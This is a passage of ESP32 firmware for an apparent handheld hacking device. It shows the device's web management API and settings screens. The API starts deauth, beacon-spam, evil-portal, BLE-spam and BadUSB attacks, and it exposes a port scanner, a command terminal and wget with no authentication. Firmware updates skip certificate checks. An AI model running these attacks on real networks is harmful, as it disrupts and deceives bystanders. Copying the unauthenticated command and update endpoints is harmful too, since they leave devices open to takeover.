            g_web_ap_pass[32] = 0;
        }
        if (ch.length() > 0) {
            int c = ch.toInt();
            if (c >= 1 && c <= 13) g_web_ap_ch = (uint8_t)c;
        }
        if (maxc.length() > 0) {
            int m = maxc.toInt();
            if (m >= 1 && m <= 10) g_web_ap_max_cli = (uint8_t)m;
        }
        if (hidden.length() > 0) {
            g_web_ap_hidden = (hidden.toInt() != 0);
        }
        
        server.send(200, "text/plain", "AP config saved. Restart WebUI to apply.");
    });
    
    // ── API: Connected Clients ──
    server.on("/api/clients", HTTP_GET, [&]() {
        String json = "[";
        // Get station info
        wifi_sta_list_t sta_list;
        tcpip_adapter_sta_list_t adapter_sta_list;
        esp_wifi_ap_get_sta_list(&sta_list);
        tcpip_adapter_get_sta_list(&sta_list, &adapter_sta_list);
        
        bool first = true;
        for (int i = 0; i < adapter_sta_list.num; i++) {
            tcpip_adapter_sta_info_t sta = adapter_sta_list.sta[i];
            if (!first) json += ",";
            first = false;
            char mac_buf[18];
            snprintf(mac_buf, sizeof(mac_buf), "%02X:%02X:%02X:%02X:%02X:%02X",
                sta.mac[0], sta.mac[1], sta.mac[2], sta.mac[3], sta.mac[4], sta.mac[5]);
            json += "{\"mac\":\"" + String(mac_buf) + "\",";
            json += "\"ip\":\"" + IPAddress(sta.ip.addr).toString() + "\",";
            json += "\"r\":-40}"; // approximate RSSI
        }
        json += "]";
        server.send(200, "application/json", json);
    });
    
    // ── API: WiFi Scan (with MAC) ──
    server.on("/api/wifi_scan", HTTP_GET, [&]() {
        // v2.2: Use APSTA mode to avoid kicking connected clients
        WiFi.mode(WIFI_AP_STA);
        delay(50);
        int n = WiFi.scanNetworks(false, true, false, 500);
        String json = "[";
        for (int i = 0; i < n; i++) {
            if (i > 0) json += ",";
            String enc = "O";
            switch (WiFi.encryptionType(i)) {
                case WIFI_AUTH_OPEN: enc = "O"; break;
                case WIFI_AUTH_WEP: enc = "WEP"; break;
                case WIFI_AUTH_WPA_PSK: enc = "WPA"; break;
                case WIFI_AUTH_WPA2_PSK: enc = "WPA2"; break;
                case WIFI_AUTH_WPA_WPA2_PSK: enc = "WPA2"; break;
                case WIFI_AUTH_WPA3_PSK: enc = "WPA3"; break;
                default: enc = "?"; break;
            }
            json += "{\"ssid\":\"" + jsonEscape(WiFi.SSID(i)) + "\",";
            json += "\"r\":" + String(WiFi.RSSI(i)) + ",";
            json += "\"ch\":" + String(WiFi.channel(i)) + ",";
            json += "\"enc\":\"" + enc + "\",";
            json += "\"mac\":\"" + WiFi.BSSIDstr(i) + "\"}";
        }
        json += "]";
        WiFi.scanDelete();
        // Restore AP mode (keep AP active)
        WiFi.mode(WIFI_AP);
        WiFi.softAP(g_web_ap_ssid, g_web_ap_pass, g_web_ap_ch, g_web_ap_hidden, g_web_ap_max_cli);
        server.send(200, "application/json", json);
    });
    
    // ── API: Ping/Latency measurement (v2.2) ──
    server.on("/api/ping", HTTP_GET, [&]() {
        String target = server.arg("host");
        if (target.length() == 0) target = "8.8.8.8";
        uint32_t t1 = millis();
        WiFiClient client;
        client.setTimeout(1000);
        bool ok = client.connect(target.c_str(), 53);
        uint32_t latency = millis() - t1;
        if (ok) client.stop();
        String json = "{\"host\":\"" + target + "\",";
        json += "\"reachable\":" + String(ok ? "true" : "false") + ",";
        json += "\"latency_ms\":" + String(latency) + ",";
        json += "\"net_latency\":" + String(g_net_latency) + "}";
        server.send(200, "application/json", json);
    });
    
    // ── API: WiFi Connect (STA mode) ──
    server.on("/api/wifi_connect", HTTP_GET, [&]() {
        String ssid = server.arg("ssid");
        String pass = server.arg("pass");
        if (ssid.length() == 0) {
            server.send(400, "text/plain", "ERR: SSID required");
            return;
        }
        // Handle disconnect
        if (ssid == "disconnect") {
            WiFi.disconnect(true);
            WiFi.mode(WIFI_AP);
            WiFi.softAP(g_web_ap_ssid, g_web_ap_pass, g_web_ap_ch, g_web_ap_hidden, g_web_ap_max_cli);
            g_wifi_mode = WM_AP;
            g_wifi_conn = false;
            server.send(200, "text/plain", "OK Disconnected, back to AP mode");
            return;
        }
        server.send(200, "text/plain", "OK Connecting to " + ssid + " (device will exit WebUI)");
        delay(100);
        // Set flag to connect after WebUI exits
        g_web_cmd = PG_RECON_WIFI;
        g_web_cmd_pending = true;
        // Store SSID/pass for connection (use separate vars, don't overwrite AP config)
        strncpy(g_sta_ssid, ssid.c_str(), 32);
        g_sta_ssid[32] = 0;
        if (pass.length() > 0 && pass.length() <= 32) {
            strncpy(g_sta_pass, pass.c_str(), 32);
            g_sta_pass[32] = 0;
        } else {
            g_sta_pass[0] = 0;
        }
    });
    
    // ── API: WiFi Disconnect ──
    server.on("/api/wifi_disconnect", HTTP_GET, [&]() {
        WiFi.disconnect(true);
        WiFi.mode(WIFI_AP);
        WiFi.softAP(g_web_ap_ssid, g_web_ap_pass, g_web_ap_ch, g_web_ap_hidden, g_web_ap_max_cli);
        g_wifi_mode = WM_AP;
        g_wifi_conn = false;
        server.send(200, "text/plain", "OK Disconnected");
    });

    // ── API: 双WiFi连接 (同时连接家里WiFi+保持AP) ──
    server.on("/api/wifi_dual_connect", HTTP_POST, [&]() {
        String body = server.arg("plain");

        // Extract ssid and pass from JSON
        auto extract = [&](String key) -> String {
            int p = body.indexOf("\"" + key + "\"");
            if (p < 0) return "";
            p = body.indexOf(":", p);
            if (p < 0) return "";
            p++;
            while (p < (int)body.length() && (body[p] == ' ' || body[p] == '"')) p++;
            String val;
            if (body[p] == '"') {
                p++;
                while (p < (int)body.length() && body[p] != '"') {
                    if (body[p] == '\\') p++;
                    else val += body[p];
                    p++;
                }
            }
            return val;
        };

        String ssid = extract("ssid");
        String pass = extract("pass");

        if (ssid.length() == 0) {
            server.send(400, "application/json", "{\"ok\":false,\"error\":\"missing ssid\"}");
            return;
        }

        // Save WiFi credentials for auto-reconnect
        g_prefs.begin("xmos", false);
        g_prefs.putString("sta_ssid", ssid);
        g_prefs.putString("sta_pass", pass);
        g_prefs.end();

        // Start dual mode
        wifi_start_dual(ssid.c_str(), pass.c_str());

        String json = "{";
        json += "\"ok\":true,";
        json += "\"dual_mode\":" + String(g_dual_wifi ? "true" : "false") + ",";
        if (g_dual_wifi) {
            json += "\"sta_ip\":\"" + WiFi.localIP().toString() + "\",";
            json += "\"ap_ip\":\"" + WiFi.softAPIP().toString() + "\",";
            json += "\"rssi\":" + String(WiFi.RSSI()) + ",";
        }
        json += "\"message\":\"双WiFi模式已启动\"";
        json += "}";
        server.send(200, "application/json", json);
    });

    // ── API: 双WiFi状态 ──
    server.on("/api/wifi_dual_status", HTTP_GET, [&]() {
        String json = "{";
        json += "\"dual_mode\":" + String(g_dual_wifi ? "true" : "false") + ",";
        json += "\"sta_connected\":" + String(WiFi.status() == WL_CONNECTED ? "true" : "false") + ",";
        if (g_dual_wifi || WiFi.status() == WL_CONNECTED) {
            json += "\"sta_ssid\":\"" + WiFi.SSID() + "\",";
            json += "\"sta_ip\":\"" + WiFi.localIP().toString() + "\",";
            json += "\"sta_rssi\":" + String(WiFi.RSSI()) + ",";
        }
        json += "\"ap_ssid\":\"" + String(g_web_ap_ssid) + "\",";
        json += "\"ap_ip\":\"" + WiFi.softAPIP().toString() + "\",";
        json += "\"ap_clients\":" + String(WiFi.softAPgetStationNum());
        json += "}";
        server.send(200, "application/json", json);
    });

    // ── API: BadUSB Script Save ──
    server.on("/api/badusb/save", HTTP_GET, [&]() {
        String script = server.arg("script");
        if (script.length() == 0) {
            server.send(400, "text/plain", "ERR: Missing script");
            return;
        }
        sd_init();
        if (sd_ok) {
            File f = SD.open("/badusb_script.txt", FILE_WRITE);
            if (f) {
                f.println(script);
                f.close();
                server.send(200, "text/plain", "OK Script saved");
            } else {
                server.send(500, "text/plain", "ERR: Cannot write file");
            }
        } else {
            server.send(500, "text/plain", "ERR: No SD card");
        }
    });
    
    // ── API: Do OTA Update ──
    server.on("/api/do_update", HTTP_GET, [&]() {
        String url = g_update_url;
        if (url.length() == 0) {
            server.send(400, "text/plain", "ERR: No update URL configured");
            return;
        }
        // Fetch version.json to get firmware URL
        HTTPClient http;
        WiFiClient chkPlain;
        WiFiClientSecure chkSsl;
        if (url.startsWith("https")) {
            chkSsl.setInsecure();
            http.begin(chkSsl, url);
        } else {
            http.begin(chkPlain, url);
        }
        int code = http.GET();
        if (code != 200) {
            server.send(500, "text/plain", "ERR: HTTP " + String(code));
            http.end();
            return;
        }
        String resp = http.getString();
        http.end();
        
        // Parse JSON to get firmware URL (heap-allocated)
        DynamicJsonDocument doc(4096);
        DeserializationError err = deserializeJson(doc, resp);
        if (err) {
            server.send(500, "text/plain", "ERR: JSON parse failed");
            return;
        }
        // Support both new format (files.ota.url) and old format (latest.url)
        const char* fwUrl = nullptr;
        if (doc["latest"].containsKey("files") && doc["latest"]["files"].containsKey("ota")) {
            fwUrl = doc["latest"]["files"]["ota"]["url"];
        } else {
            fwUrl = doc["latest"]["url"];
        }
        if (!fwUrl) {
            server.send(500, "text/plain", "ERR: No firmware URL in version.json");
            return;
        }
        
        // Resolve relative URL
        String fullUrl = String(fwUrl);
        if (fullUrl.startsWith("firmware/")) {
            // Resolve relative to version.json URL
            int lastSlash = url.lastIndexOf('/');
            if (lastSlash > 0) {
                fullUrl = url.substring(0, lastSlash + 1) + fullUrl;
            }
        }
        
        // Download firmware
        HTTPClient fwHttp;
        WiFiClient fwPlain;
        WiFiClientSecure fwSsl;
        if (fullUrl.startsWith("https")) {
            fwSsl.setInsecure();
            fwHttp.begin(fwSsl, fullUrl);
        } else {
            fwHttp.begin(fwPlain, fullUrl);
        }
        int fwCode = fwHttp.GET();
        if (fwCode != 200) {
            server.send(500, "text/plain", "ERR: FW download HTTP " + String(fwCode));
            fwHttp.end();
            return;
        }
        int len = fwHttp.getSize();
        WiFiClient* stream = fwHttp.getStreamPtr();
        if (!stream) {
            server.send(500, "text/plain", "ERR: No stream available");
            fwHttp.end();
            return;
        }
        
        if (!Update.begin(len > 0 ? len : UPDATE_SIZE_UNKNOWN)) {
            server.send(500, "text/plain", "ERR: Update.begin failed");
            fwHttp.end();
            return;
        }
        size_t written = Update.writeStream(*stream);
        fwHttp.end();
        
        if (len > 0 && written != (size_t)len) {
            Update.abort();
            server.send(500, "text/plain", "ERR: Write incomplete");
            return;
        }
        if (!Update.end()) {
            server.send(500, "text/plain", "ERR: Update.end failed");
            return;
        }
        
        server.send(200, "text/plain", "OK Rebooting...");
        delay(500);
        ESP.restart();
    });
    
    // ── API: BLE Scan ──
    server.on("/api/ble_scan", HTTP_GET, [&]() {
        NimBLEDevice::init("");
        NimBLEScan* scan = NimBLEDevice::getScan();
        scan->setActiveScan(false);
        scan->setInterval(160);
        scan->setWindow(160);
        NimBLEScanResults results = scan->getResults(15);
        String json = "[";
        int cnt = 0;
        for (int i = 0; i < results.getCount() && cnt < 30; i++) {
            const NimBLEAdvertisedDevice* dev = results.getDevice(i);
            if (!dev->haveName() && !dev->haveManufacturerData()) continue;
            if (cnt > 0) json += ",";
            String name = dev->haveName() ? String(dev->getName().c_str()) : "Unknown";
            name = jsonEscape(name);
            json += "{\"name\":\"" + name + "\",";
            json += "\"r\":" + String(dev->getRSSI()) + "}";
            cnt++;
        }
        json += "]";
        scan->clearResults();
        NimBLEDevice::deinit(false);  // don't delete resources, just stop
        g_ble_on = false;
        server.send(200, "application/json", json);
    });
    
    // ── API: Attack Control ──
    server.on("/api/attack", HTTP_GET, [&]() {
        String type = server.arg("type");
        String action = server.arg("action");
        
        if (action == "start") {
            g_web_restore = true;  // restore AP+WebUI after attack
            // Map attack type to page
            if (type == "deauth") {
                g_web_cmd = PG_ATTK_DEAUTH;
                g_web_cmd_pending = true;
                server.send(200, "text/plain", "OK Deauth starting. Device will exit WebUI to run attack.");
            } else if (type == "beacon") {
                g_web_cmd = PG_ATTK_BEACON;
                g_web_cmd_pending = true;
                server.send(200, "text/plain", "OK Beacon starting. Device will exit WebUI to run attack.");
            } else if (type == "portal") {
                g_web_cmd = PG_ATTK_PORTAL;
                g_web_cmd_pending = true;
                server.send(200, "text/plain", "OK Portal starting. Device will exit WebUI to run attack.");
            } else if (type == "ble") {
                g_web_cmd = PG_ATTK_BLE;
                g_web_cmd_pending = true;
                server.send(200, "text/plain", "OK BLE spam starting. Device will exit WebUI to run attack.");
            } else if (type == "badusb") {
                g_web_cmd = PG_ATTK_BADUSB;
                g_web_cmd_pending = true;
                server.send(200, "text/plain", "OK BadUSB starting. Device will exit WebUI to run attack.");
            } else if (type == "defense") {
                g_web_cmd = PG_ATTK_DEFENSE;
                g_web_cmd_pending = true;
                server.send(200, "text/plain", "OK Defense starting. Device will exit WebUI to run defense.");
            } else {
                server.send(400, "text/plain", "ERR: Unknown attack type: " + type);
            }
        } else if (action == "stop") {
            // Stop attack: reset flags
            g_web_cmd_pending = false;
            g_web_cmd = PG_MENU;
            g_wifi_atk = ATK_OFF;
            g_ble_atk = ATK_OFF;
            g_wifi_def = ATK_OFF;
            server.send(200, "text/plain", "OK " + type + " stopped");
        } else {
            server.send(400, "text/plain", "ERR: unknown action: " + action);
        }
    });
    
    // ── API: File Manager (list, delete, mkdir, upload, download) ──
    server.on("/api/files", HTTP_GET, [&]() {
        String path = server.arg("path");
        if (path.length() == 0) path = "/";
        String json = "[";
        sd_init();
        if (sd_ok) {
            File dir = SD.open(path);
            if (dir && dir.isDirectory()) {
                File f = dir.openNextFile();
                bool first = true;
                while (f) {
                    if (!first) json += ",";
                    first = false;
                    String name = f.name();
                    if (name.startsWith(path)) {
                        name = name.substring(path.length());
                        if (name.startsWith("/")) name = name.substring(1);
                    }
                    name = jsonEscape(name);
                    json += "{\"name\":\"" + name + "\",";
                    json += "\"size\":" + String(f.size()) + ",";
                    json += "\"dir\":" + String(f.isDirectory() ? "true" : "false") + "}";
                    f = dir.openNextFile();
                }
                dir.close();
            }
        }
        json += "]";
        server.send(200, "application/json", json);
    });
    
    server.on("/api/files/delete", HTTP_GET, [&]() {
        String path = server.arg("path");
        if (path.length() == 0) { server.send(400, "text/plain", "ERR"); return; }
        sd_init();
        bool ok = sd_ok && SD.remove(path);
        server.send(ok ? 200 : 500, "text/plain", ok ? "OK" : "ERR");
    });
    
    server.on("/api/files/mkdir", HTTP_GET, [&]() {
        String path = server.arg("path");
        if (path.length() == 0) { server.send(400, "text/plain", "ERR"); return; }
        sd_init();
        bool ok = sd_ok && SD.mkdir(path);
        server.send(ok ? 200 : 500, "text/plain", ok ? "OK" : "ERR");
    });
    
    server.on("/api/files/download", HTTP_GET, [&]() {
        String path = server.arg("path");
        if (path.length() == 0) { server.send(400, "text/plain", "ERR"); return; }
        sd_init();
        if (sd_ok && SD.exists(path)) {
            File f = SD.open(path);
            if (f) { server.streamFile(f, "application/octet-stream"); f.close(); return; }
        }
        server.send(404, "text/plain", "ERR");
    });
    
    server.on("/api/files/upload", HTTP_POST, 
        [&]() { server.send(200, "text/plain", "OK"); },
        [&]() {
            HTTPUpload& u = server.upload();
            if (u.status == UPLOAD_FILE_START) {
                sd_init();
                String path = "/" + u.filename;
                File f = SD.open(path, FILE_WRITE);
                if (f) f.close();
            } else if (u.status == UPLOAD_FILE_WRITE) {
                String path = "/" + u.filename;
                File f = SD.open(path, FILE_APPEND);
                if (f) { f.write((uint8_t*)u.buf, u.currentSize); f.close(); }
            }
        });
    
    // ── API: Port Scanner ──
    server.on("/api/portscan", HTTP_GET, [&]() {
        String ip = server.arg("ip");
        String sPort = server.arg("start");
        String ePort = server.arg("end");
        if (ip.length() == 0) { server.send(400, "text/plain", "ERR"); return; }
        int startP = (sPort.length() > 0) ? sPort.toInt() : 1;
        int endP = (ePort.length() > 0) ? ePort.toInt() : 1024;
        if (endP - startP > 100) endP = startP + 99; // limit to 100 ports to avoid long WebUI block
        String json = "{\"ip\":\"" + ip + "\",\"results\":[";
        WiFiClient client;
        bool first = true;
        for (int port = startP; port <= endP; port++) {
            if (client.connect(ip.c_str(), port, 200)) {
                if (!first) json += ",";
                first = false;
                json += "{\"port\":" + String(port) + ",\"open\":true}";
                client.stop();
            }
            yield();
        }
        json += "]}";
        server.send(200, "application/json", json);
    });
    
    // ── API: Terminal (execute command) ──
    server.on("/api/term", HTTP_GET, [&]() {
        String cmd = server.arg("cmd");
        if (cmd.length() == 0) {
            server.send(400, "text/plain", "ERR: Missing 'cmd' parameter");
            return;
        }
        sd_init();
        String out = term_exec(cmd);
        if (cmd == "reboot") {
            server.send(200, "text/plain", "Rebooting...");
            delay(500);
            ESP.restart();
        }
        server.send(200, "text/plain", out);
    });
    
    // ── API: HTTP Download (wget) ──
    server.on("/api/wget", HTTP_GET, [&]() {
        String url = server.arg("url");
        String outname = server.arg("out");
        if (url.length() == 0) {
            server.send(400, "text/plain", "ERR: Missing 'url' parameter");
            return;
        }
        sd_init();
        String cmd = "wget " + url;
        if (outname.length() > 0) cmd += " " + outname;
        String out = term_exec(cmd);
        server.send(200, "text/plain", out);
    });
    
    // ── API: Reboot ──
    server.on("/api/reboot", HTTP_GET, [&]() {
        server.send(200, "text/plain", "Rebooting...");
        delay(500);
        ESP.restart();
    });
    
    // ── API: Update URL Config ──
    server.on("/api/update_url", HTTP_GET, [&]() {
        // Support ?url= parameter for saving via GET
        if (server.hasArg("url")) {
            String newUrl = server.arg("url");
            newUrl.trim();
            if (newUrl.length() < 128) {
                strncpy(g_update_url, newUrl.c_str(), 127);
                g_update_url[127] = '\0';
                update_url_save(g_update_url);
                server.send(200, "text/plain", "OK");
                return;
            } else {
                server.send(400, "text/plain", "URL too long");
                return;
            }
        }
        String json = "{\"url\":\"" + String(g_update_url) + "\"}";
        server.send(200, "application/json", json);
    });
    
    server.on("/api/update_url", HTTP_POST, [&]() {
        if (server.hasArg("plain")) {
            String body = server.arg("plain");
            body.trim();
            if (body.length() < 128) {
                strncpy(g_update_url, body.c_str(), 127);
                g_update_url[127] = '\0';
                update_url_save(g_update_url);
                server.send(200, "text/plain", "OK Update URL saved");
            } else {
                server.send(400, "text/plain", "URL too long");
            }
        } else {
            server.send(400, "text/plain", "Missing body");
        }
    });
    
    // ── API: Check for Updates (fetches remote version.json, HTTP & HTTPS) ──
    server.on("/api/check_update", HTTP_GET, [&]() {
        if (strlen(g_update_url) == 0) {
            server.send(200, "application/json", "{\"error\":\"No update URL configured\"}");
            return;
        }
        HTTPClient http;
        bool isHttps = (strncmp(g_update_url, "https", 5) == 0);
        WiFiClient* plain = nullptr;
        WiFiClientSecure* ssl = nullptr;
        if (isHttps) {
            ssl = new WiFiClientSecure();
            ssl->setInsecure();  // Skip cert validation
            http.begin(*ssl, g_update_url);
        } else {
            plain = new WiFiClient();
            http.begin(*plain, g_update_url);
        }
        http.setTimeout(8000);
        int code = http.GET();
        if (code == 200) {
            String body = http.getString();
            server.send(200, "application/json", body);
        } else {
            String err = "{\"error\":\"HTTP " + String(code) + "\"}";
            server.send(200, "application/json", err);
        }
        http.end();
        if (plain) delete plain;
        if (ssl) delete ssl;
    });
    
    // ── API: List .bin files on SD card ──
    server.on("/api/sd_bins", HTTP_GET, [&]() {
        sd_init();
        String json = "[";
        if (sd_ok) {
            File root = SD.open("/");
            if (root) {
                File f = root.openNextFile();
                bool first = true;
                while (f) {
                    if (!f.isDirectory()) {
                        String name = f.name();
                        if (name.endsWith(".bin") || name.endsWith(".BIN")) {
                            if (!first) json += ",";
                            first = false;
                            json += "{\"name\":\"" + name + "\",\"size\":" + String(f.size()) + "}";
                        }
                    }
                    f = root.openNextFile();
                }
                root.close();
            }
        }
        json += "]";
        server.send(200, "application/json", json);
    });
    
    // ── API: SD Card Firmware Update ──
    server.on("/api/sd_update", HTTP_GET, [&]() {
        if (!server.hasArg("file")) {
            server.send(400, "text/plain", "Missing file parameter");
            return;
        }
        String fname = server.arg("file");
        if (!fname.startsWith("/")) fname = "/" + fname;
        
        sd_init();
        if (!sd_ok) {
            server.send(500, "text/plain", "SD card not available");
            return;
        }
        
        File f = SD.open(fname, "r");
        if (!f) {
            server.send(404, "text/plain", "File not found: " + fname);
            return;
        }
        
        size_t fsize = f.size();
        Serial.printf("[SD-OTA] Opening %s (%u bytes)\n", fname.c_str(), fsize);
        
        if (!Update.begin(fsize)) {
            Serial.printf("[SD-OTA] ERROR: begin failed: %s\n", Update.errorString());
            Update.abort(); // ensure clean state
            f.close();
            server.send(500, "text/plain", "Update.begin failed: " + String(Update.errorString()));
            return;
        }
        
        server.send(200, "text/plain", "OK Flashing from SD card...");
        
        // Stream file to Update in chunks
        uint8_t buf[4096];
        size_t total = 0;
        while (f.available()) {
            size_t len = f.read(buf, sizeof(buf));
            if (Update.write(buf, len) != len) {
                Serial.printf("[SD-OTA] ERROR: write failed at %u/%u\n", total, fsize);
                Update.abort();
                f.close();
                return;
            }
            total += len;
            yield();
        }
        f.close();
        
        if (Update.end(true)) {
            Serial.printf("[SD-OTA] Done: %u bytes verified OK\n", total);
            delay(500);
            ESP.restart();
        } else {
            Serial.printf("[SD-OTA] ERROR: end failed: %s\n", Update.errorString());
        }
    });
    
    // ── OTA Update (CSRF-protected via query token) ──
    server.on("/update", HTTP_POST, 
        [&]() {
            // CSRF check: verify token from query parameter
            if (!server.hasArg("csrf") || server.arg("csrf") != String(csrf_token)) {
                Serial.println("[OTA] CSRF check FAILED - rejected");
                Update.abort();
                server.send(403, "text/plain", "CSRF FAIL");
                return;
            }
            // Called after ALL upload chunks are processed
            if (Update.hasError()) {
                Serial.printf("[OTA] FINAL ERROR: %s\n", Update.errorString());
                server.send(500, "text/plain", "FAIL");
            } else {
                Serial.println("[OTA] SUCCESS - rebooting...");
                server.send(200, "text/plain", "OK");
                delay(500);
                ESP.restart();
            }
        },
        [&]() {
            HTTPUpload& u = server.upload();
            if (u.status == UPLOAD_FILE_START) {
                Serial.printf("[OTA] Start: %s (%u bytes)\n", u.filename.c_str(), u.totalSize);
                // Use actual size if known, otherwise UPDATE_SIZE_UNKNOWN
                uint32_t sz = (u.totalSize > 0) ? u.totalSize : UPDATE_SIZE_UNKNOWN;
                if (!Update.begin(sz)) {
                    Serial.printf("[OTA] ERROR: Update.begin failed: %s\n", Update.errorString());
                    Update.abort(); // ensure clean state
                } else {
                    Serial.printf("[OTA] Flash erase done, writing...\n");
                }
            } else if (u.status == UPLOAD_FILE_WRITE) {
                size_t written = Update.write(u.buf, u.currentSize);
                if (written != u.currentSize) {
                    Serial.printf("[OTA] ERROR: Write failed (%u/%u): %s\n",
                        written, u.currentSize, Update.errorString());
                    Update.abort();
                }
                // CRITICAL: yield to WiFi stack to prevent AP disconnection
                yield();
            } else if (u.status == UPLOAD_FILE_END) {
                if (Update.end(true)) {
                    Serial.printf("[OTA] Done: %u bytes verified OK\n", u.totalSize);
                } else {
                    Serial.printf("[OTA] ERROR: Update.end failed: %s\n", Update.errorString());
                    Update.abort();
                }
            }
        }
    );
    
    // ── Captive portal: all other requests → redirect to / ──
    server.onNotFound([&]() {
        server.sendHeader("Location", "/", true);
        server.send(302, "text/plain", "");
    });
    
    server.begin();
    g_ble_on = false;
    
    // Draw static layout once
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("网页管理");

    tft.drawRect(2, CONTENT_Y + 14, SCR_W - 4, 72, C_DGRAY);
    tft.setTextFont(1);
    cnfont_print(8, CONTENT_Y + 18, "热点:", C_WHITE, C_BLACK);
    tft.setTextColor(C_WHITE, C_BLACK);
    tft.setCursor(48, CONTENT_Y + 18);
    tft.print(g_web_ap_ssid);
    cnfont_print(8, CONTENT_Y + 34, "密码:", C_WHITE, C_BLACK);
    tft.setTextColor(C_WHITE, C_BLACK);
    tft.setCursor(48, CONTENT_Y + 34);
    tft.print(g_web_ap_pass);
    cnfont_print(8, CONTENT_Y + 50, "地址:", C_WHITE, C_BLACK);
    tft.setTextColor(C_CYAN, C_BLACK);
    tft.setCursor(48, CONTENT_Y + 50);
    tft.print(ip.toString());
    tft.setTextColor(C_WHITE, C_BLACK);
    tft.setCursor(8, CONTENT_Y + 66);
    tft.print("http://192.168.4.1");
    tft.setTextColor(C_RED, C_BLACK);
    cnfont_print(4, SCR_H - 22, "B:停止", C_RED, C_BLACK);
    
    while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) {
        dns.processNextRequest();
        // Handle multiple pending requests per loop iteration
        // (browser sends CSS/JS/API calls concurrently)
        for (int i = 0; i < 20; i++) {
            server.handleClient();
        }
        yield();
    }
    
    server.stop();
    dns.stop();
    WiFi.softAPdisconnect(true);
    g_wifi_mode = WM_OFF;
}

// ═══════════════ SYSTEM: Time ═══════════════
static void sys_time() {
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("时间设置");

    tft.drawRect(2, CONTENT_Y + 14, SCR_W - 4, 40, C_DGRAY);
    cnfont_print(8, CONTENT_Y + 18, "格式:", C_WHITE, C_BLACK);
    tft.setTextColor(C_WHITE, C_BLACK);
    tft.setCursor(48, CONTENT_Y + 18);
    tft.print(g_cfg.time24h ? "24H" : "12H");
    cnfont_print(8, CONTENT_Y + 34, "A:切换  B:返回", C_WHITE, C_BLACK);

    scr_draw_bottom("A:切换", "B:返回");

    while (true) {
        if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) break;
        if (buttons_get_event(BTN_ID_A) == BTN_EVENT_PRESS) {
            g_cfg.time24h = !g_cfg.time24h;
            tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
            scr_draw_title("时间设置");
            tft.drawRect(2, CONTENT_Y + 14, SCR_W - 4, 40, C_DGRAY);
            cnfont_print(8, CONTENT_Y + 18, "格式:", C_WHITE, C_BLACK);
            tft.setTextColor(C_WHITE, C_BLACK);
            tft.setCursor(48, CONTENT_Y + 18);
            tft.print(g_cfg.time24h ? "24H" : "12H");
            cnfont_print(8, CONTENT_Y + 34, "A:切换  B:返回", C_WHITE, C_BLACK);
        }
        delay(30);
    }
}

// ═══════════════ SYSTEM: Brightness ═══════════════
static void sys_brightness() {
    bool need_redraw = true;
    
    while (true) {
        if (need_redraw) {
            need_redraw = false;
            tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
            scr_draw_title("亮度");

            tft.drawRect(2, CONTENT_Y + 14, SCR_W - 4, 40, C_DGRAY);
            cnfont_print(8, CONTENT_Y + 18, "等级:", C_WHITE, C_BLACK);
            tft.setTextColor(C_WHITE, C_BLACK);
            tft.setCursor(48, CONTENT_Y + 18);
            tft.print(g_cfg.brightness);
            tft.print("/10");
            cnfont_print(8, CONTENT_Y + 34, "上下:调节", C_WHITE, C_BLACK);

            // Bar
            tft.drawRect(8, CONTENT_Y + 60, 144, 8, C_DGRAY);
            tft.fillRect(9, CONTENT_Y + 61, 142 * g_cfg.brightness / 10, 6, C_CYAN);

            scr_draw_bottom("上下:调节", "B:返回");
        }
        
        if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) break;
        if (buttons_get_event(BTN_ID_UP) == BTN_EVENT_PRESS && g_cfg.brightness < 10) {
            g_cfg.brightness++;
            need_redraw = true;
        }
        if (buttons_get_event(BTN_ID_DOWN) == BTN_EVENT_PRESS && g_cfg.brightness > 0) {
            g_cfg.brightness--;
            need_redraw = true;
        }
        delay(30);
    }
}

// ═══════════════ SYSTEM: Buzzer ═══════════════
static void sys_buzzer() {
    bool need_redraw = true;
    
    while (true) {
        if (need_redraw) {
            need_redraw = false;
            tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
            scr_draw_title("蜂鸣");

            tft.drawRect(2, CONTENT_Y + 14, SCR_W - 4, 40, C_DGRAY);
            cnfont_print(8, CONTENT_Y + 18, "状态:", C_WHITE, C_BLACK);
            tft.setTextColor(g_cfg.buzzer_on ? C_SGREEN : C_RED, C_BLACK);
            tft.setCursor(48, CONTENT_Y + 18);
            tft.print(g_cfg.buzzer_on ? "ON" : "OFF");
            cnfont_print(8, CONTENT_Y + 34, "A:切换  B:返回", C_WHITE, C_BLACK);

            scr_draw_bottom("A:切换", "B:返回");
        }
        
        if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) {
            break;
        }
        if (buttons_get_event(BTN_ID_A) == BTN_EVENT_PRESS) {
            g_cfg.buzzer_on = !g_cfg.buzzer_on;
            need_redraw = true;
        }
        delay(30);
    }
}

// ═══════════════ SYSTEM: Reboot ═══════════════

// ── Auto-discover WebDAV server on local network ──
// Scans IPs for port 8080 serving version.json
static bool auto_discover_server() {
    Serial.println("[UPDATE] Auto-discovering server...");
    
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("Auto Scan");
    tft.setTextFont(1);
    tft.setTextColor(C_CYAN, C_BLACK);
    tft.setCursor(4, CONTENT_Y + 16);
    tft.print("Scanning LAN...");
    tft.drawFastHLine(4, CONTENT_Y + 26, SCR_W - 8, C_DGRAY);
    
    IPAddress baseIP;
    int startHost, endHost;
    
    if (g_wifi_mode == WM_AP) {
        // AP mode: phone connected to our AP at 192.168.4.x
        baseIP = IPAddress(192, 168, 4, 0);
        startHost = 2;
        endHost = 10;
        tft.setTextColor(C_DGRAY, C_BLACK);
        tft.setCursor(4, CONTENT_Y + 28);
        tft.print("AP mode 192.168.4.x");
    } else if (g_wifi_mode == WM_STA) {
        // STA mode: scan same subnet
        IPAddress myIP = WiFi.localIP();
        baseIP = IPAddress(myIP[0], myIP[1], myIP[2], 0);
        startHost = 1;
        endHost = 20;
        tft.setTextColor(C_DGRAY, C_BLACK);
        tft.setCursor(4, CONTENT_Y + 28);
        tft.printf("LAN %d.%d.%d.x", myIP[0], myIP[1], myIP[2]);
    } else {
        return false;
    }
    
    int scanY = CONTENT_Y + 40;
    int foundY = CONTENT_Y + 52;
    
